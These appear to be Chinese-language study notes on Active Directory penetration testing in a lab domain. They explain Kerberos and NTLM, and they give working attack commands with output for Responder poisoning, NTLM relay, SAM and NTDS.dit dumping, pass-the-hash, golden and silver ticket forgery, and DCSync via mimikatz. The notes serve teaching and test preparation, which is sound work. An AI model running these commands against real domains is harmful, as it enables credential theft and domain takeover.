Neo4j下载：https://neo4j.com/download-center/#community

下载bloodHound，github

下载域内信息收集：https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors，这里下载一个exe或ps1文件就可以了，这需要在登录域环境的电脑下面进行信息的收集。



## 信任域

什么是信任域？

将一个域加入到另外一个已经存在的域环境中，这两个与就已经产生了关系，可能是父子、朋友（并行）的关系；

注：如果要加入域，则必须能够ping通被加入域的域名，即需要设置dns；

将安装好的域环境升级为域控制器，会有三个选项：

-   add a domain controller to an existing domain；平行域，一般用来做备份使用；

    ![image-20230325104805974](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\image-20230325104805974.png)

    指定备份/同步的数据来自哪里，可以是一个media路径，也可以是我们指定的域名；

    

-   add a new domain to an existing forest；父子域，这里加入的时候new domain name可以随便写，添加到指定域的用户名为：administrator@deelmind.lab，密码就输入administrator的密码即可。

    ![image-20230325102914845](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\image-20230325102914845.png)

-   add a new forest；





## Kerberos

官网：https://web.mit.edu/kerberos/

### 什么是Kerberos

Kerberos是一种计算机网络授权协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。密码不在网络上传输，提高安全性；



### 简写名词

AS（Authentication Server）：认证服务器；

KDC（Key Distribution Center）：秘钥分发中心；

TGT（Ticket Granting Ticket）：票据授权票据，票据的票据；

TGS（Ticket Granting Server）：票据授权服务器；



上面这些都只是域控服务器当中的一个软件而已，不是独立服务。



### 认证过程

Client-->用户名-->Server



#### 1、Kerberos组件

![er](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\1.png)

![er](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\0.png)



#### 2、Kerberos流程

![er](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\2.png)

#### 3、AS_REQ（请求AS服务器）

![er](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\3.png)

#### 4、AS_REP（AS响应）

![er](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\4.png)

#### 5、客户端解密

![er](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\5.png)

#### 6、TGS_REQ

![er](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\6.png)

#### 7、服务端解密

![er](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\7.png)

#### 8、TGS Cache

![er](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\8.png)

#### 9、TGS_REP

![er](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\9.png)

#### 10、客户端加密

![er](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\10.png)

#### 11、S_REQ

![er](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\11.png)

#### 12、服务端解密

![er](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\12.png)

#### 13、Service Cache

![er](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\13.png)

#### 14、服务端加密

![er](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\14.png)

#### 15、S_REP

![er](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\15.png)

#### 16、客户端解密

![er](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\16.png)

#### 17、用户缓存服务KEY

![er](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\17.png)





### wireshark抓包过程

#### 1、AS_REQ

![image-20230325204208087](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\image-20230325204208087.png)



#### 2、AS_REP



## NTLM

Windows New Tochnology LAN Manager（NTLM）是问询/应答（Challenge/Response）身份验证协议，如果Kerberos无法对用户进行身份验证，系统将尝试改用NTLM；

-   LM Hash (LAN Manager===>Local Area Network Manager)

-   NTLM Hash(NT Hash) 

-   NTLMv1(Net-NTLMv1)，可以使用[hastcat](https://github.com/hashcat/hashcat)进行破解；

-   NTLMSSP（NTLMSecurity Support Provider）

    ```
    netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c
    ```

-   NTLMv2(Net-NTLMv2)

    ```
    vagrant::UA-COMPUTER:a1e7b994fceaf520:DEF951B748B1BD0EA53056B8394ADE8F:010100000000000000B288B74DEAD8017F0B6B94E20909E90000000002000800480032005000490001001E00570049004E002D004F003300460031005A004600560034005A004800440004003400570049004E002D004F003300460031005A004600560034005A00480044002E0048003200500049002E004C004F00430041004C000300140048003200500049002E004C004F00430041004C000500140048003200500049002E004C004F00430041004C000700080000B288B74DEAD80106000400020000000800300030000000000000000000000000300000AC9FBB1C666A6A6D9DEEF6E44868B3432CD364FA736028D0AB1E5E9BD40CDB360A001000000000000000000000000000000000000900100063006900660073002F006100620063000000000000000000
    ```

自Windows Vista/Server2008开始，系统默认禁用Net-NTLMv1，使用Net-NTLMv2

v1格式：`username::hostname:LM response:NTLM response:challenge`

v2格式：`username::domain:challenge:HMAC-MD5:blob`



### NTLM认证流程

-   客户端向服务器发送HTTP请求，请求获得服务器资源,如访问邮件服务器资源
-   服务器由于开启了NTLM认证，所以返回401的错误码(未授权)，提示需要NTLM认证
-   客户端发起NTLM认证，向服务器发送协商消息
-   服务器收到消息后，生成一个随机数Challenge，明文发送回客户端
-   客户端接收到Challenge后，使用密码hash（来自本地的SAM文件，这里也就是问题点，因为这里的hash我们是可以盗取的）对Challenge加密，生成Response并发送给服务器
-   服务器接收到Response后，会向DC(Domain Controller)发送针对客户端的验证请求，该请求主要包含以下三方面的内容：客户端用户名，客户端密码哈希值加密的Challenge和原始的Challenge
-   DC根据用户名获取该帐号的密码哈希值，对原始的Challenge进行加密。如果加密后的Challenge和服务器发送的一致，则意味着用户拥有正确的密码，验证通过，否则验证失败。DC将验证结果发给服务器，并最终反馈给客户端

![er](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\ntlm.png)

![er](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\ntlm-wireshark.png)



## NTLM-Relay

### 为什么使用NTLM

NTLM 是一个过时的协议。与 Kerberos 相比，它的安全性和功能更少。

-   回退选项– 如果 Kerberos 失败，客户端将回退到 NTLM。
-   工作组身份验证- NTLM 仍用于对配置为工作组成员的系统进行身份验证。
-   本地身份验证- NTLM 在非域控制器上的本地登录身份验证期间运行。
-   向后兼容性——Windows 95、Windows 98 和 Windows NT 4.0 等旧系统不是 Active Directory 域的成员，因此它们使用 NTLM 来验证本地登录。
-   不存在的 [SPN](https://learn.microsoft.com/zh-cn/windows/win32/ad/service-principal-names) – 如果客户端请求 Active Directory (AD) 中不存在的服务主体名称 (SPN)，Kerberos 将无法工作。例如，使用 IP 而不是名称来访问资源而不注册 SPN。
-   无法连接到 DNS 或 DC – 当客户端和 DNS/DC 之间没有连接时，将使用 NTLM。
-   混合环境——NTLM 仍可用于将非域客户端与域客户端或域帐户与本地用户帐户相结合的混合环境中。



###  什么是NTLM-Relay攻击【了解】

视频：https://www.bilibili.com/list/282616786?sid=2262497&spm_id_from=333.999.0.0&desc=1&oid=517736335&bvid=BV1Wg411v7qF

该攻击有点类似arp攻击。

![er](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\ntlm_relay.png)



### 攻击工具

-   impacket；

    impacket下面有一个工具集

    ![image-20230327225843139](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\image-20230327225843139.png)

    其中包含了很多的工具，NTLM-Relayx就是下面的一个，我们使用它来做ntlm的转发。

    ```
    impacket-ntlmrelayx -t target/victim -smb2support -c commands
    ```

    

-   responder，kali自带

```shell
$ sudo responder -I eth1

[*] [MDNS] Poisoned answer sent to 192.168.10.101  for name fjaida.local
[*] [MDNS] Poisoned answer sent to fe80::b0a1:c7bc:aaa1:b285 for name fjaida.local
[*] [MDNS] Poisoned answer sent to 192.168.10.101  for name fjaida.local
[*] [MDNS] Poisoned answer sent to fe80::b0a1:c7bc:aaa1:b285 for name fjaida.local
[*] [NBT-NS] Poisoned answer sent to 192.168.10.101 for name FJAIDA (service: File Server)
[*] [MDNS] Poisoned answer sent to 192.168.10.101  for name fjaida.local
[*] [MDNS] Poisoned answer sent to fe80::b0a1:c7bc:aaa1:b285 for name fjaida.local
[*] [MDNS] Poisoned answer sent to 192.168.10.101  for name fjaida.local
[*] [LLMNR]  Poisoned answer sent to fe80::b0a1:c7bc:aaa1:b285 for name fjaida
[*] [MDNS] Poisoned answer sent to fe80::b0a1:c7bc:aaa1:b285 for name fjaida.local
[*] [LLMNR]  Poisoned answer sent to 192.168.10.101 for name fjaida
[*] [LLMNR]  Poisoned answer sent to fe80::b0a1:c7bc:aaa1:b285 for name fjaida
[*] [LLMNR]  Poisoned answer sent to 192.168.10.101 for name fjaida
[SMB] NTLMv2-SSP Client   : fe80::b0a1:c7bc:aaa1:b285
[SMB] NTLMv2-SSP Username : DEELMIND\user1
[SMB] NTLMv2-SSP Hash     : user1::DEELMIND:b755665ca881706f:7BFA2867F455DE1D0F5995FC6B5F1458:010100000000000080A6C75C3D60D9019E097AF0266D87E40000000002000800590059003800330001001E00570049004E002D004F00460033004B004D0047004C00440037004B00430004003400570049004E002D004F00460033004B004D0047004C00440037004B0043002E0059005900380033002E004C004F00430041004C000300140059005900380033002E004C004F00430041004C000500140059005900380033002E004C004F00430041004C000700080080A6C75C3D60D90106000400020000000800300030000000000000000000000000200000D7412E4416D4F9AE3FF3BE9A2B5AE734F6F880B74FE0E6B0ABC319E084EECE920A001000000000000000000000000000000000000900160063006900660073002F0066006A0061006900640061000000000000000000
```

注意：当我们使用responder工具攻击一个机器之后，responder会对其进行缓存操作，后面就不会在捕获了，所以这里可能需要对缓存的文件删除一下`/usr/share/responder/Responder.db`



## 密码Hash

>   注意权限问题
>
>   mimikatz提权privilege::debug



### 加密方式

windows中hash结构一般为`username:RID:LM-hsah:NTLM-hash`，windwos 2000之后LM-hash都为空，因为很容易破解一般被禁用。NTLM密码hash保存在`%SystemRoot%\System32\config\SAM`，在域中，用户信息保存在`C:\Windows\NTDS\NTDS.dit`中

windows中密码格式：`Username:RID:LM-Hash:NT-Hash`，在LM禁用的版本中为空值。



### SAM文件

SAM存放本地用户HASH

提取SAM

```
mimikatz lsadump::sam
reg save HKLM\SYSTEM system.hiv  # 在powershell终端执行
reg save HKLM\SAM sam.hiv
reg save HKLM\SECURITY secuirty.hiv
```





### NTDS.DIT

NTDS.DIT存放域内所有用户的HASH

提取NTDS.DIT

```
ntdsutil "ac i ntds" ifm "create full c:\\users\\temp" q q
NTDSDumpEx.exe -d "C:\Users\temp\Active Directory\ntds.dit" -s C:\Users\temp\registry\SYSTEM -o out.txt  # 工具为NTDSDumpEx.exe,在out.txt文件当中就可以看到所有用户的hash值
```



## PTH

PTH（Pass-the-Hash）是一种凭证盗窃和横向移动技术，攻击者滥用NTLM身份验证协议以用户身份验证，而无需获得账户的明文。由于攻击者使用密码散列，通常仅在密码本身更改时才会更改，因此攻击者有大量时间滥用受感染的账户。

连接条件：对方必须开启ADMIN$共享，可以使用`net share`查看：

![image-20230326231934088](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\image-20230326231934088.png)



工具，PsExec64.exe：https://github.com/aetonsi/bin__psexec64/blob/main/PsExec64.exe

连接：

```
PsExec64.exe \\192.168.10.210 powershell
```



### 获取NTLM

```shell
mimikatz # privilege::debug   # 提权
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 260439 (00000000:0003f957)
Session           : Interactive from 1
User Name         : vagrant
Domain            : DEELMIND
Logon Server      : ROOT
Logon Time        : 2023/3/25 7:21:41
SID               : S-1-5-21-2353069989-2815075995-2277803342-1000
        msv :
         [00000003] Primary
         * Username : vagrant
         * Domain   : DEELMIND
         * NTLM     : e02bc503339d51f71d913c245d35b50b
         * SHA1     : c805f88436bcd9ff534ee86c59ed230437505ecf
         * DPAPI    : 9d3be41cc8d9d2b1810fb4877e50b190
        tspkg :
        wdigest :
         * Username : vagrant
         * Domain   : DEELMIND
         * Password : (null)
        kerberos :
         * Username : vagrant
         * Domain   : DEELMIND.LAB
         * Password : (null)
        ssp :
        credman :
```



### PTH

```
mimikatz # sekurlsa::pth /user:vagrant /ntlm:e02bc503339d51f71d913c245d35b50b /domain:deelmind.lab # 执行完成之后会弹出回一个会话框，后面的连接就是在这个会话框里面进行
user    : vagrant
domain  : deelmind.lab
program : cmd.exe
impers. : no
NTLM    : e02bc503339d51f71d913c245d35b50b
  |  PID  12092
  |  TID  12096
  |  LSA Process is now R/W
  |  LUID 0 ; 10308631 (00000000:009d4c17)
  \_ msv1_0   - data copy @ 000001590BAD8070 : OK !
  \_ kerberos - data copy @ 000001590C3B4D28
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 000001590C2D2428 (32) -> null
```



### 连接shell

```
psexec64.exe \\root powershell
```

![image-20230326234740498](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\image-20230326234740498.png)





## PTT

### Golden Ticket

用户的Ticket都是由krbtgt用户的密码Hash来生成的，我们如果拿到了krbtgt的密码Hash，就可以随意伪造Ticket（需要域控权限）。通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket，作为后门，权限维持。

![image-20230328093139699](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\image-20230328093139699.png)

![image-20230328093524627](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\image-20230328093524627.png)



1、导出域控ticket

```
mimikatz # privilege::debug   # 权限提升

mimikatz # lsadump::dcsync /domain:deelmind.lab /user:krbtgt  # 导出票据
[DC] 'deelmind.lab' will be the domain
[DC] 'root.deelmind.lab' will be the DC server
[DC] 'krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 2023/3/21 7:43:18
Object Security ID   : S-1-5-21-2353069989-2815075995-2277803342-502  # 关注点
Object Relative ID   : 502

Credentials:
  Hash NTLM: 45aac00e7aa65033cd61b4329b6d7fed  # 关注点
    ntlm- 0: 45aac00e7aa65033cd61b4329b6d7fed
    lm  - 0: 7bb8174ea2c90371ae28ed7f48a92168

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 1d0d52fe6e4b391b8dc5de8ddb630684

* Primary:Kerberos-Newer-Keys *
    Default Salt : DEELMIND.LABkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 9e85e81e632d6569115449dd52d8ce795e190ddb617d2292fda5303411654849  # 关注点
      aes128_hmac       (4096) : b9f609b5f4af1ba2429562c96851a998
      des_cbc_md5       (4096) : 1a625b371fcd76a7

* Primary:Kerberos *
    Default Salt : DEELMIND.LABkrbtgt
    Credentials
      des_cbc_md5       : 1a625b371fcd76a7

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  f7aebd02747e604a1c638d870d95751f
    02  6477bc64f1ad2e3baaff2bf50b0d2a2f
    03  e7041b8f83c1abab937197609c378360
    04  f7aebd02747e604a1c638d870d95751f
    05  6477bc64f1ad2e3baaff2bf50b0d2a2f
    06  5b099c10141a9dca423e5a8465821b61
    07  f7aebd02747e604a1c638d870d95751f
    08  a96f8c89d33f056e0c387e3704e5f06f
    09  a96f8c89d33f056e0c387e3704e5f06f
    10  06e96469abfe186ef7274bfc60f4810b
    11  c63e6a8dc092ea6cfbb07a4825dfad9e
    12  a96f8c89d33f056e0c387e3704e5f06f
    13  88ea589b684a00c264e5491f93e23a7a
    14  c63e6a8dc092ea6cfbb07a4825dfad9e
    15  8ee39012a7de3e500b1eea66f7b64070
    16  8ee39012a7de3e500b1eea66f7b64070
    17  f5c6990c38df1ef1242640fa139761d4
    18  12dd488ed1e40c1994ea8c888a9097ef
    19  6a9cd27877ed4ce6135455d8c500bbca
    20  60a8d9ccb946380733ed590f19714164
    21  fb20e3ce9e66d412a1cb0a8bdea5f9a2
    22  fb20e3ce9e66d412a1cb0a8bdea5f9a2
    23  a92a6d022a6f5fa0fd0d48bf7b5510b7
    24  664c64bb637568e69b5367cacbf7622d
    25  664c64bb637568e69b5367cacbf7622d
    26  ce93adb0bf3fc6cf7663a74ebc046c20
    27  35f8ac16a46fa5a071c4c4a6db2380b1
    28  783957e45ee3c56393a8594ceff6f54d
    29  952ce7399f8b2b364d5316e81c82bb66
```

2、伪造ticket

```
mimikatz.exe "kerberos::golden /domain:deelmind.lab /aes256:9e85e81e632d6569115449dd52d8ce795e190ddb617d2292fda5303411654849 /sid:S-1-5-21-2353069989-2815075995-2277803342-502 /krbtgt:45aac00e7aa65033cd61b4329b6d7fed /user:anyone /ticket:golden.kirbi"  
```

/krbtgt:cd6abf9b42e7868f57f93b552f742b9c  后面的hash是krbtgt用户的ntlm hash值

/user:anyone表示我们伪造的用户名；

/ticket:golden.kirbi表示将伪造的票据输出到该文件当中



3、导入ticket

在上面获取到黄金票据之后，我们就可以拿着该票据在任意一台机器上将该票据导入到内存中进而操作DC机器了。注：一定要在管理员powershell中进行执行，否则可能会执行失败

```
.\mimikatz.exe

mimikatz # privilege::debug
mimikatz # kerberos::ptt golden.kirbi   # 在导入之前可以使用cmd命令klist查看一下当前的用户
mimikatz # exit
klist
```

![image-20230328125822133](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\image-20230328125822133.png)

4、PSExec连接

```
psexec \\root.deelmind.lab command命令 # 这里需要与上面的实在同一个窗口当中
# 注：黄金/白银票据都是针对Kerberos协议进行攻击；psexec使用smb协议，所以在测试的时候需要注意看他们身份验证所走的一个协议，因为smb可能走kerberos，也可能走ntlm。
```

![image-20230328125845268](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\image-20230328125845268.png)





### Silver Ticket

服务的Ticket是使用服务的Hash进行加密的，通常为计算机账户Hash加密，就可以给我们自己签发任意用户的TGS票据（service ticket），这个票据也被称为白银票据，可以跳过KDC认证直接去访问指定的服务，但是只能访问特定服务。伪造的白银票据没带有效KDC签名的PAC（[Privilege Attribute Certificateopen in new window](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/166d8064-c863-41e1-9c23-edaaa5f36962)），如果将目标主机配置为验证KDCPAC签名，则银票将不起作用。



1、获取服务hash

```
mimikatz "privilege::debug" "sekurlsa::logonpasswords"

Authentication Id : 0 ; 331601 (00000000:00050f51)
Session           : Interactive from 1
User Name         : vagrant
Domain            : DEELMIND
Logon Server      : ROOT
Logon Time        : 2023/3/27 14:56:55
SID               : S-1-5-21-2353069989-2815075995-2277803342-1000
        msv :
         [00000003] Primary
         * Username : vagrant
         * Domain   : DEELMIND
         * NTLM     : e02bc503339d51f71d913c245d35b50b
         * SHA1     : c805f88436bcd9ff534ee86c59ed230437505ecf
         * DPAPI    : 9d3be41cc8d9d2b1810fb4877e50b190
        tspkg :
        wdigest :
         * Username : vagrant
         * Domain   : DEELMIND
         * Password : (null)
        kerberos :
         * Username : vagrant
         * Domain   : DEELMIND.LAB
         * Password : (null)
        ssp :
        credman :
```

2、伪造Ticket

```
mimikatz "kerberos::golden /domain:deelmind.lab /sid:S-1-5-21-2353069989-2815075995-2277803342 /target:deelmind.lab /service:cifs /rc4:e02bc503339d51f71d913c245d35b50b /user:anyone /ptt"
```

`/service:cifs`  指定服务为cifs(smb)

`/rc4:e02bc503339d51f71d913c245d35b50b` NTLM hash

`/sid:S-1-5-21-2353069989-2815075995-2277803342` 去掉SID最后一个“-”号后面的内容

`/ptt` ： no output in file, just inject the golden ticket in current session.

`/ticket` - *optional* - filename for output the ticket - default is: ticket.kirbi.

## 内网协议

### [SMB](https://learn.microsoft.com/zh-cn/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview)

SMB（Server Message Block）是网络文件共享协议，用于在计算机间共享文件、打印机等，电脑上的网上邻居由它实现，端口445；在很早期的Windows中（Windows2000以下），文件共享服务是利用TCP的139端口实现的，服务器名是SMB；后来微软将SMB改名为CIFS协议，并且使用的是TCP的445端口。

-   域内SMB走Kerberos；
-   其它SMB走NTLM；



### LLMNR

LLMNR（Link-Local Multicast Name Resolution），链路本地多播名称解析 (LLMNR) 和 NetBIOS 名称服务 (NBT-NS) 是 Windows 机器在 DNS 解析失败时用于识别网络上的主机地址的两个名称解析服务。现代 Windows 计算机上默认启用 LLMNR 和 NetBIOS。

数据格式：

![er](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\llmnr-16801426281441.png)





### NetBIOS

NetBIOS为网络基本输入输出系统（network basic input/output system）的缩写，它提供了OSI模型中的会话层服务，让在不同电脑上运行的不同程序，可以在局域网中互相连线，以及分享资料。严格来说，NetBIOS不是一种网络协议，而是应用程序接口（API）。较古老的操作系统，使用IEEE802.2与IPX/SPX协议，可以使用NetBIOS Frames协议或NetBIOS over IPX/SPX协议来运作。现代操作系统，多数都使用TCP/IP协议，则可以透过NetBIOS over TCP/IP协议来互相通信。



-   NetBIOS提供三种软件服务

| Service Name            | Port | Protocol | Short Name |
| ----------------------- | ---- | -------- | ---------- |
| NetBIOS Name Service    | 137  | UDP/TCP  | NBNS       |
| NetBIOS Datagram        | 138  | UDP      | NBND       |
| NetBIOS Session Service | 139  | TCP      | NBSS       |



### SSDP

SSDP（Simple Sever Discovery Protocol）,简单服务发现协议，采用基于通知和发现路由的多播发现方式实现。



### MDNS

MDNS（Multicast DNS），多播发现主机IP地址；



### NBNS

NBNS是NetBIOS Name Service的缩写，是NetBIOS的命名服务，用于将NetBIOS名称映射到IP地址上，是NetBIOS-over-TCP(NBT)协议族的一份子。NBNS是动态DNS的一种，Microsoft的NBNS实现称为WINS。路由器可以通过发送NBNS状态请求以获取设备名，windows PC 接收到后通过WINS或将本地缓存发送命名信息给路由器。



### [WPAD](https://learn.microsoft.com/en-us/windows/win32/winhttp/winhttp-autoproxy-support)

网络代理自动发现协议（Web Proxy Auto-Discovery Protocol，WPAD）是一种客户端使用DHCP和/或DNS发现方法来定位一个配置文件URL的方法。在检测和下载配置文件后，它可以执行配置文件以测定特定URL应使用的代理。

[MS16-077](https://support.microsoft.com/en-us/topic/ms16-077-security-update-for-wpad-june-14-2016-2490f086-dc17-4a6e-2799-a974d1af385e)

```JS
sc query winhttpautoproxysvc   # 查看是否开启wpad

### wpad.dat文件内容
function FindProxyForURL(url, host) {
    if (host == "127.0.0.1" || isPlainHostName(host) || shExpMatch (host, "(192.168.253.15)")) {
        return "DIRECT";
    }

    return "PROXY 192.168.253.15:8080";
}
```

![er](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\wpad.png)



## Windows主机名解析顺序

具体情况，具体分析，不一定如此。

1.  查看本地`C:\Windows\System32\drivers\etc\hosts`文件
2.  DNS服务器中进行查找
3.  利用LLMNR和NetBIOS





## DCSync攻击

### 什么是DCSync

DCSync模仿一个域控制器（可以使用mimikatz进行模仿），从真实的域控制器中请求获取数据，例如账号的口令散列值等数据。



###  DCSync攻击前提

-   Administrators组内的用户
-   Domain Admins组内的用户
-   Enterprise Admins组内的用户
-   是域内的账户也可以尝试一下；



### DCSync攻击

```JS
mimikatz "lsadump::dcsync /domain:deelmind.lab /all"
```

本质上是mimikatz模仿一个域控制器，然后从我们指定的域控哪里获取数据；类似做备份。



## LDAP攻击

### 什么是[LDAP](https://ldapwiki.com/wiki/LDAP)

LDAP（Lightweight Directory Access Protocol）轻量目录访问`协议`，[Active Directory是由LDAP协议](https://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx)在Windows上实现的。

![er](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\ldap.png)

| 简称 | 全称               |
| ---- | ------------------ |
| DC   | Domain Component   |
| OU   | Organization Unit  |
| CN   | Common Name        |
| SN   | Surname            |
| DN   | Distinguished Name |
| UID  | User ID            |
| RND  | Relative DN        |



### 基础语法

```JS
(&(A)(B))  # A且B

(|(A)(B))

(|(&(A)(B))(C))  # (A且B)或C

(A=B)

(A~=B)  # A大于等于B，注意不能写成>=

(!(A=B)) # A不等于B

(A=*) #A等于任意值

(A>B) # A大于B

(A<=B) # A小于等于B
```

用法：https://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx，下面有实例。

| **objectCategory**   | **objectClass**      | **Result**                          |
| -------------------- | -------------------- | ----------------------------------- |
| person               | user                 | user objects                        |
| person               |                      | user and contact objects            |
| person               | contact              | contact objects                     |
|                      | user                 | user and computer objects           |
| computer             |                      | computer objects                    |
| user                 |                      | user and contact objects            |
|                      | contact              | contact objects                     |
|                      | computer             | computer objects                    |
|                      | person               | user, computer, and contact objects |
| contact              |                      | user and contact objects            |
| group                |                      | group objects                       |
|                      | group                | group objects                       |
| person               | organizationalPerson | user and contact objects            |
|                      | organizationalPerson | user, computer, and contact objects |
| organizationalPerson |                      | user and contact objects            |

| All user objects                                             | (&(objectCategory=person)(objectClass=user))                 |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| All user objects (Note 1)                                    | (sAMAccountType=805306368)                                   |
| All computer objects                                         | (objectCategory=computer)                                    |
| All contact objects                                          | (objectClass=contact)                                        |
| All group objects                                            | (objectCategory=group)                                       |
| All organizational unit objects                              | (objectCategory=organizationalUnit)                          |
| All container objects                                        | (objectCategory=container)                                   |
| All builtin container objects                                | (objectCategory=builtinDomain)                               |
| All domain objects                                           | (objectCategory=domain)                                      |
| Computer objects with no description                         | (&(objectCategory=computer)(!(description=*)))               |
| Group objects with a description                             | (&(objectCategory=group)(description=*))                     |
| Users with cn starting with "Joe"                            | (&(objectCategory=person)(objectClass=user)  (cn=Joe*))      |
| Object with description "East\West Sales"  (Note 2)          | (description=East\5CWest Sales)                              |
| Phone numbers in form (xxx) xxx-xxx                          | (telephoneNumber=(*)*-*)                                     |
| Groups with cn starting with  "Test" or "Admin"              | (&(objectCategory=group)  (                                  |
| All users with both a first and last name.                   | (&(objectCategory=person)(objectClass=user)  (givenName=*)(sn=*)) |
| All users with direct reports but no  manager                | (&(objectCategory=person)(objectClass=user)  (directReports=*)(!(manager=*))) |
| All users with specified email address                       | (&(objectCategory=person)(objectClass=user)  (               |
| All users with Logon Script: field occupied                  | (&(objectCategory=person)(objectClass=user)(scriptPath=*))   |
| Object with Common Name "Jim * Smith"  (Notes 3, 19)         | (cn=Jim \2A Smith)                                           |
| Objects with sAMAccountName that begins  with "x", "y", or "z" | (sAMAccountName>=x)                                          |
| Objects with sAMAccountName that begins with "a" or any number or symbol except "$" | (&(sAMAccountName<=a)(!(sAMAccountName=$*)))                 |
| All users with "Password Never Expires" set  (Note 4)        | (&(objectCategory=person)(objectClass=user)  (userAccountControl:1.2.840.113556.1.4.803:=65536)) |
| All disabled user objects (Note 4)                           | (&(objectCategory=person)(objectClass=user)  (userAccountControl:1.2.840.113556.1.4.803:=2)) |
| All enabled user objects (Note 4)                            | (&(objectCategory=person)(objectClass=user)  (!(userAccountControl:1.2.840.113556.1.4.803:=2))) |
| All users not required to have a password  (Note 4)          | (&(objectCategory=person)(objectClass=user)  (userAccountControl:1.2.840.113556.1.4.803:=32)) |
| All users with "Do not require kerberos  preauthentication" enabled | (&(objectCategory=person)(objectClass=user)  (userAccountControl:1.2.840.113556.1.4.803:=4194304)) |
| Users with accounts that do not expire  (Note 5)             | (&(objectCategory=person)(objectClass=user)  (               |
| Users with accounts that do expire (Note 5)                  | (&(objectCategory=person)(objectClass=user)  (accountExpires>=1)  (accountExpires<=9223372036854775806)) |
| Accounts trusted for delegation  (unconstrained delegation)  | (userAccountControl:1.2.840.113556.1.4.803:=524288)          |
| Accounts that are sensitive and not trusted  for delegation  | (userAccountControl:1.2.840.113556.1.4.803:=1048576)         |
| All distribution groups (Notes 4, 15)                        | (&(objectCategory=group)  (!(groupType:1.2.840.113556.1.4.803:=2147483648))) |
| All security groups (Notes 4, 19)                            | (groupType:1.2.840.113556.1.4.803:=2147483648)               |
| All built-in groups (Notes 4, 16, 19)                        | (groupType:1.2.840.113556.1.4.803:=1)                        |
| All global groups (Notes 4, 19)                              | (groupType:1.2.840.113556.1.4.803:=2)                        |
| All domain local groups (Notes 4, 19)                        | (groupType:1.2.840.113556.1.4.803:=4)                        |
| All universal groups (Notes 4, 19)                           | (groupType:1.2.840.113556.1.4.803:=8)                        |
| All global security groups (Notes 17, 19)                    | (groupType=-2147483646)                                      |
